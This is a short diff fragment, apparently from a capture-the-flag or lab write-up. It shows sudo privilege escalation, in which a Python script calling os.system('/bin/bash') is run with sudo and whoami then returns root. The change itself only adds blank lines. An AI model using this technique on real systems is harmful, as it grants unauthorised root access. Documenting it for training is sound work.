@@ -40,8 +40,11 @@ import os
 os.system('/bin/bash')
 
 iker@181f77f462ad:~$ sudo /usr/bin/python3 /home/iker/geo_ip.py
+
 root@181f77f462ad:/home/iker# whoami
+
 root
+
 root@181f77f462ad:/home/iker# 
 
 
